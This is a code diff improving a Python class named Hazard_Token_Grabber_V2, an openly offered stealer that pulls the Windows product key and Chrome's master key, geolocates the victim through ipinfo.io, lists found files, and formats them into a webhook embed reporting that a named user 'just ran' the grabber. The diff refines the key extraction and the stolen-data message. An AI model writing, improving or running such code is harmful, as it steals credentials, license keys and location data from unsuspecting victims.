@@ -148,32 +148,36 @@ class Hazard_Token_Grabber_V2:
         with open(bd, "wt", encoding="cp437") as f:
             f.write(content2)
 
-    def getProductKey(self, path: str = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
+    def getProductKey(self, path: str = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
         def strToInt(x):
             if isinstance(x, str):
                 return ord(x)
             return x
         chars = 'BCDFGHJKMPQRTVWXY2346789'
-        result = ''
+        wkey = ''
         offset = 52
-        reg = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
-        val, _ = winreg.QueryValueEx(reg, 'DigitalProductID')
+        regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
+        val, _ = winreg.QueryValueEx(regkey, 'DigitalProductID')
+        productName, _ = winreg.QueryValueEx(regkey, "ProductName")
         key = list(val)
-    
+
         for i in range(24,-1, -1):
             temp = 0
             for j in range(14,-1,-1):
                 temp *= 256
-                temp += strToInt(key[j+ offset])
+                try:
+                    temp += strToInt(key[j+ offset])
+                except IndexError:
+                    return [productName, ""]
                 if temp / 24 <= 255:
                     key[j+ offset] = temp/24
                 else:
                     key[j+ offset] = 255
                 temp = int(temp % 24)
-            result = chars[temp] + result
-        for i in range(5,len(result),6):
-            result = result[:i] + '-' + result[i:]
-        return result
+            wkey = chars[temp] + wkey
+        for i in range(5,len(wkey),6):
+            wkey = wkey[:i] + '-' + wkey[i:]
+        return [productName, wkey]
 
     def get_master_key(self):
         with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
@@ -381,7 +385,8 @@ class Hazard_Token_Grabber_V2:
         image.close()
 
     def SendInfo(self):
-        wkey = self.getProductKey()
+        wname = self.getProductKey()[0]
+        wkey = self.getProductKey()[1]
         ip = country = city = region = googlemap = "None"
         try:
             data = requests.get("http://ipinfo.io/json").json()
@@ -405,7 +410,6 @@ class Hazard_Token_Grabber_V2:
         for f in files:
             self.files += f"\n{f}"
         self.fileCount = f"{len(files)} Files Found: "
-        backslash = "\n"
         embed = {
             "avatar_url":"https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif",
             "embeds": [
@@ -415,7 +419,7 @@ class Hazard_Token_Grabber_V2:
                         "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
                         "icon_url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif"
                     },
-                    "description": f'**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}{backslash+"Windows Key: "+wkey if wkey else ""}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
+                    "description": f'**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                     "color": 16119101,
 
                     "thumbnail": {
